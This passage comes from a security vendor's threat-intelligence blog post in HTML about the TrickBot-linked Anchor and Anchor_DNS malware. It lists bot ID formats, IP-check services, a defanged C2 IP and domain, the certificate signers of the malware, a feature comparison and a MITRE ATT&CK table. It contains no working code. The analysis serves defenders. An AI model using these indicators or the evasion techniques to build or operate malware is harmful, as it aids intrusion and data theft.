<td style="text-align: left; width: 644.444px;">
<p>/<strong>anchor001</strong>/<span style="color: #ff0201;"><strong>jujubox-PC</strong></span>_<span style="color: #93c47d;"><strong>W617601</strong></span>.<span style="color: #0600ff;"><strong>6E8516CA48318FB2904E2027B5350B26</strong></span></p>
</td>
</tr>
<tr>
<td style="text-align: left; width: 133.333px;">
<p>Trickbot</p>
</td>
<td style="text-align: left; width: 644.444px;">
<p>/<strong>mor49</strong>/<span style="color: #ff0201;"><strong>DAVID-PC</strong></span>_<span style="color: #93c47d;"><strong>W10017134</strong></span>.<span style="color: #0600ff;"><strong>55C60B5D13499341D72F5A34C632CFD9</strong></span></p>
</td>
</tr>
</tbody>
</table>
<h4>External IP Check Web Services</h4>
<p>Both <em>Anchor</em> and older versions of <em>Anchor_DNS</em> use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine. The same list is also used by TrickBot:</p>
<p>checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.</p>
<p>In certain cases, if internet connectivity cannot be reached, <em>Anchor</em> and older versions of <em>Anchor_DNS</em> will delete themselves.</p>
<h4>Shared C2 Infrastructure</h4>
<p>TrickBot, <em>Anchor, </em>and<em> Anchor_DNS</em> typically use a separate C2 infrastructure. However, in some instances of this attack, there was C2 server overlap between these infrastructures. For example, the IP 23.95.97[.]59, which is hardcoded in an <em>Anchor</em> sample, has also served <em>Anchor_DNS</em> and TrickBot:</p>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=447&amp;name=Dropping%20the%20Anchor-121.png" alt="" style="display: block; margin-left: auto; margin-right: auto; width: 447px;" width="447" srcset="https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=224&amp;name=Dropping%20the%20Anchor-121.png 224w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=447&amp;name=Dropping%20the%20Anchor-121.png 447w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=671&amp;name=Dropping%20the%20Anchor-121.png 671w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=894&amp;name=Dropping%20the%20Anchor-121.png 894w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=1118&amp;name=Dropping%20the%20Anchor-121.png 1118w, https://www.cybereason.com/hs-fs/hubfs/Dropping%20the%20Anchor-121.png?width=1341&amp;name=Dropping%20the%20Anchor-121.png 1341w" sizes="(max-width: 447px) 100vw, 447px"></div>
<p style="text-align: center;"><em>Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)</em></p>
<p><strong>Connection to TrickBot</strong></p>
<p>This above IP address was used by TrickBot to download the <em>squlDLL</em> plugin, which includes email harvesting from <a href="https://www.fortinet.com/blog/threat-research/new-trickbot-plugin-harvests-email-addresses-from-sql-servers-screenlocker-module-not-for-ransom.html">SQL servers, screenlocker, and Mimikatz</a>.</p>
<p><strong>Connection to Anchor_DNS</strong></p>
<p>The same IP resolved to a domain <a href="https://technical.nttsecurity.com/post/102fsp2/trickbot-variant-anchor-dns-communicating-over-dns">previously used by Anchor_DNS</a>, chishir[.]com.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=487&amp;name=image-160.png" width="487" style="width: 487px; display: block; margin-left: auto; margin-right: auto;" srcset="https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=244&amp;name=image-160.png 244w, https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=487&amp;name=image-160.png 487w, https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=731&amp;name=image-160.png 731w, https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=974&amp;name=image-160.png 974w, https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=1218&amp;name=image-160.png 1218w, https://www.cybereason.com/hs-fs/hubfs/image-160.png?width=1461&amp;name=image-160.png 1461w" sizes="(max-width: 487px) 100vw, 487px"></p>
<p style="text-align: center;"><em>Passive DNS information of 23.95.97[.]59 , taken from </em><a href="https://www.virustotal.com/gui/ip-address/23.95.97.59/relations">VirusTotal</a><em>.</em></p>
<h3>Comparison Between Anchor Malware Family</h3>
<p>The following table gives a comparison between different malware in the Anchor malware family.</p>
<table style="border-color: #000000; border-collapse: collapse; table-layout: fixed;" cellpadding="4" border="1">
<tbody>
<tr>
<td style="text-align: center;">
<p><strong>Features</strong></p>
</td>
<td style="text-align: center;">
<p><strong>Anchor</strong></p>
</td>
<td style="text-align: center;">
<p><strong>Old Anchor_DNS</strong></p>
</td>
<td style="text-align: center;">
<p><strong>New Anchor_DNS</strong></p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>Earliest Observed Sample&nbsp;</p>
</td>
<td style="text-align: center;">
<p>August 2018</p>
</td>
<td style="text-align: center;">
<p>May 2019</p>
</td>
<td style="text-align: center;">
<p>November 2019</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>Command-line arguments?&nbsp;</p>
</td>
<td style="text-align: center;">
<p>-</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>Self-Deletion</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>-</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>Network Connectivity check via ICMP</p>
</td>
<td style="text-align: center;">
<p>-</p>
</td>
<td style="text-align: center;">
<p>-</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>Network Connectivity check via web services</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>-</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>NTFS ADS files</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
<td style="text-align: center;">
<p>+</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>TrickBot’s GUID Generation pattern</p>
</td>
<td style="text-align: center;">
<p>+</p>
<p>(Cleartext)</p>
</td>
<td style="text-align: center;">
<p>+</p>
<p>(base64)</p>
</td>
<td style="text-align: center;">
<p>+</p>
<p>(base64)</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>Code Obfuscation</p>
</td>
<td style="text-align: center;">
<p>Very Little</p>
</td>
<td style="text-align: center;">
<p>Very Little</p>
</td>
<td style="text-align: center;">
<p>Obfuscated Code</p>
</td>
</tr>
<tr>
<td style="text-align: left;">
<p>C2 Communication Protocols</p>
</td>
<td style="text-align: center;">
<p>HTTP(S)</p>
</td>
<td style="text-align: center;">
<p>DNS</p>
</td>
<td style="text-align: center;">
<p>ICMP, DNS</p>
</td>
</tr>
</tbody>
</table>
<a id="signed" data-hs-anchor="true"></a>
<h2>Rise of Signed Malware</h2>
<p>Code signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not been tampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the case. Nowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions that grant trust to signed binaries.</p>
<p>Malicious files in this attack were signed by:</p>
<ul>
<li>Biller FIN Oy</li>
<li>NIRMAL 0013 Limited</li>
<li>BRO-BURGER, LLC</li>
</ul>
<p>TrickBot payloads and<em> Anchor / Anchor_DNS</em> payloads were at times signed by the same signer, which further demonstrate that these malware are most likely used by the same threat actor.</p>
<p>In searching for additional signed known and unknown files, we were able to identify dozens of malware samples signed by the same organizations. Some were also signed with the same serial number.</p>
<ol>
<li><strong>Biller FIN Oy Signer:</strong></li>
</ol>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-120.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p>A VirusTotal Signer name <a href="https://www.virustotal.com/gui/search/signature%253A%2522Biller%2520FIN%2520Oy%2522/files">search</a> shows malware associated with these campaigns:</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-163.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p>A VirusTotal Serial Number <a href="https://www.virustotal.com/gui/search/signature%253A%252206%252027%2520E6%25203C%2520FA%252011%252017%252045%252084%252028%2520D3%252092%2520DF%2520AA%25208D%2520AE%2522/files">search</a> shows malware associated with the campaigns:</p>
<div><img src="https://www.cybereason.com/hubfs/Dropping%20the%20Anchor-137.png" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<a id="conclusion" data-hs-anchor="true"></a>
<h2>Conclusion</h2>
<p>This research gives a detailed step-by-step analysis of recent attacks targeting the financial, manufacturing, and retail sectors across the United States and Europe. These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation leveraging a new malware, <em>Anchor</em>, and a new variant of <em>Anchor_DNS</em>.</p>
<p>Unlike <a href="https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware">previously reported TrickBot attacks</a> that resulted in mass ransomware infections, these new attacks focus on stealing sensitive information from POS systems and other sensitive resources in the victims’ network by compromising critical assets.</p>
<p>In addition, Cybereason discovered a previously undocumented malware called <em>Anchor</em> as well as a new variant of the recently discovered <em>Anchor_DNS</em> malware. Both <em>Anchor</em> and <em>Anchor_DNS</em> are directly related to TrickBot infections and have code similarities, and sometimes also share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over DNS, and the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many security products including certain sandboxes and AV vendors.</p>
<p>These attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high volume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If they identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as an entry point to other machines on the network.</p>
<p>This research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our research, we noticed certain TTP overlaps&nbsp; with earlier attacks that were attributed&nbsp; to the financially-motivated FIN6 threat actor. We leave it to our readers to draw their own conclusions on the attribution of these attacks.</p>
<p>Lastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve, security practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in general.</p>
<p><span style="font-style: italic; font-weight: bold;">The best way to defend against an attack like this is to use an iterative security process. </span><a href="/unleashing-the-true-potential-mitre-attck?hsCtaTracking=d8b5fccc-df9b-4621-86be-9d72ad635e7f%7C31de2ef9-bf97-4290-a751-4c3ec822e56c" rel=" noopener" style="font-style: italic; font-weight: bold;">Read more in our white paper.&nbsp;</a></p>
<a id="IOCs" data-hs-anchor="true"></a>
<h2>Indicators of Compromise</h2>
<p>For a comprehensive list of indicators of compromise, please see the <a href="/hubfs/Indicators%20of%20Compromise/Anchor%20IOCs.pdf" rel="noopener" target="_blank">PDF file for this attack here.</a></p>
<a id="mitre" data-hs-anchor="true"></a>
<h2>MITRE ATT&amp;CK Techniques</h2>
<table style="border-color: #000000; border-collapse: collapse; table-layout: fixed; height: 993px;" cellpadding="3" border="1" width="828">
<tbody>
<tr style="height: 63px;">
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Initial Access</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Execution</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Persistence</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Privilege Escalation</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Defense Evasion</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Credential Access</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Discovery</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Collection</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>Exfiltration</strong></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><strong>C&amp;C</strong></span></p>
</td>
</tr>
<tr style="height: 92px;">
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1192">Spearphishing Link</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1204">User Execution</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1053">Scheduled Task</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1053">Scheduled Task</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1112">Modify Registry</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1503">Credentials from Web Browsers</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1012">Query Registry</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1115">Clipboard Data</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1048">Exfiltration Over Alternative Protocol</a></span></p>
</td>
<td style="text-align: left; height: 92px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1132">Data Encoding</a></span></p>
</td>
</tr>
<tr style="height: 94px;">
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1053">Scheduled Task</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1176">Browser Extensions</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1088">Bypass User Account Control</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1116">Code Signing</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1110">Brute Force</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1082">System Information Discovery</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1001">Data Obfuscation</a></span></p>
</td>
</tr>
<tr style="height: 125px;">
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1106">Execution through API</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1055">Process Injection</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1134">Access Token Manipulation</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1055">Process Injection</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1145">Private Keys</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1069">Permission Groups Discovery</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1071">Standard Application Layer Protocol</a></span></p>
</td>
</tr>
<tr style="height: 125px;">
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1059">Command-Line Interface</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1140">Deobfuscate/Decode Files or Information</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1003">Credential Dumping</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1087">Account Discovery</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1105">Remote File Copy</a></span></p>
</td>
</tr>
<tr style="height: 94px;">
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1086">PowerShell</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1088">Bypass User Account Control</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1482">Domain Trust Discovery</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1065">Uncommonly Used Port</a></span></p>
</td>
</tr>
<tr style="height: 63px;">
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1085">Rundll32</a></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1036">Masquerading</a></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1043">Commonly Used Port</a></span></p>
</td>
</tr>
<tr style="height: 63px;">
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1064">Scripting</a></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1096">NTFS File Attributes</a></span></p>
</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 63px; width: 77.7778px;">&nbsp;</td>
</tr>
<tr style="height: 125px;">
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1047">Windows Management Instrumentation</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1134">Access Token Manipulation</a></span></p>
</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 125px; width: 77.7778px;">&nbsp;</td>
</tr>
<tr style="height: 94px;">
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1129">Execution through Module Load</a></span></p>
</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
<td style="text-align: left; height: 94px; width: 77.7778px;">&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p></span>
          
          
          <!-- CONDITIONAL Author Box Display -->
            <div class="container columns cr-mln__author-listing-single">
              
                <div class="column headshot is-3-full-hd is-3-desktop is-3-tablet is-12-mobile">
                  <img class="cr-speaker-headshot" src="https://www.cybereason.com/hubfs/CR_Owl_Web_Mono@3x%202.png" alt="Cybereason Nocturnus">
                </div>
              
              <div class="column is-9-full-hd is-9-desktop is-12-mobile">
                <span class="descriptor">About the Author</span>
                <h4>Cybereason Nocturnus</h4>
                
                  <a class="social" href="https://www.linkedin.com/company/cybereason" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-linkedin.png">
                  </a>
                
                
                  <a class="social" href="https://twitter.com/cr_nocturnus" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg">
                  </a>
                
                
                  <p>The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.</p>
                
                
                  <a class="cr-button cr-button__min" href="https://www.cybereason.com/blog/authors/cybereason-nocturnus">All Posts by Cybereason Nocturnus</a>
                
              </div>            
            </div>
          
        <!-- CONDITIONAL Post Type Choices -->
        
        <!-- Malicious Life Post -->
        
        
        <!-- CISO Stories -->
        
        <!-- Webinar -->
        
          
        <!-- CONDITIONAL Transcript -->
          
        
      </div>
       
    </div>
  </div>
</div></div>

</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="display: none;" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1616011887658867" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__blog-listing related-posts__wrapper">
    <h3>Related Posts</h3>
  <div class="container container-is-blog columns is-multiline page-center">
      
          
          
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
          
          
      
  </div>
</section>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-3 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_161767462015235" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><div class="cr-mln__blog-listing-page__subscribe-footer">
  <div class="container container-is-blog columns page-center">
    <div class="column is-8-fullhd is-8-desktop is-10-tablet is-12-mobile">
      <span class="tag">NEWSLETTER</span>
      <h3>Never miss a blog</h3>
      <p>Get the latest research, expert insights, and security industry news.</p>
      <a class="cr-button cr-mln__subscribe" href="#blog-subscribe">Subscribe</a>
    </div>
    <!--<div class="column is-5-fullhd is-5-desktop is-half-tablet is-12-mobile is-offset-1-fullhd is-offset-1-desktop">
      <div class="inputs-wrapper">
        
        
      </div>
    </div>-->
  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16036762394194314" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- FOOTER -->

<footer class="cr-section cr-footer cr-footer__full">
    <div class="container page-center">
      <div class="columns">
          <div class="column is-6-fullhd is-5-desktop cr-footer__col cr-footer__left">
            <div class="cr-footer__Left-logo">
              <a href="https://www.cybereason.com">
                <img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-logo-web-horizontal-white-500px.png">
              </a>
            </div>
          </div>
          <div class="columns column is-6-fullhd is-6-desktop cr-footer__col cr-footer__right">
            <div class="cr-footer__links-list column">
              <h4>About</h4>
              <ul>
                <li><a href="https://www.cybereason.com/company/who-we-are">Who We Are</a>
                </li><li><a href="https://www.cybereason.com/company/careers">Careers</a>
                </li><li><a href="https://www.cybereason.com/company/leadership-and-advisory-board">Leadership</a>
                </li><li><a href="https://www.cybereason.com/company/contact-us">Contact</a>
              </li></ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Resources</h4>
              <ul>
                <li><a href="https://www.cybereason.com/blog">Blog</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/case-study">Case Studies</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/webinars">Webinars</a></li>
                <li><a href="https://www.cybereason.com/resources/tag/white-papers">White Papers</a></li>
             </ul>
            </div>
            <div class="cr-footer__links-list column">
              <h4>Platform</h4>
              <ul>
                <li><a href="https://www.cybereason.com/platform">Overview</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-prevention">Endpoint Protection</a></li>
                <li><a href="https://www.cybereason.com/platform/endpoint-detection-response-edr">EDR</a></li>
                <li><a href="https://www.cybereason.com/platform/managed-detection-response-mdr">MDR</a></li>
              </ul>
            </div>
          </div>
      </div>
    </div>
  
    <div class="container page-center">
      <div class="columns cr-footer__bottom-bar">
        <div class="column">
          <p>©Cybereason 2021. All Rights Reserved.</p>
        </div>
        <div class="column bottom-bar__links">
          <ul>
            <li><a href="https://www.cybereason.com/terms-of-use">Terms of Use</a></li>
            <li><a href="https://www.cybereason.com/privacy-notice">Privacy Notice</a></li>
            <li><a href="https://www.cybereason.com/security">Security</a></li>
            <!--<li><a href="#">Cookie Policy</a></li>-->
          </ul>
        </div>

        <div class="column bottom-bar__social">
          <ul>
            <li><a class="facebook" href="https://www.facebook.com/Cybereason/"></a></li>
            <li><a class="twitter" href="https://twitter.com/cybereason"></a></li>
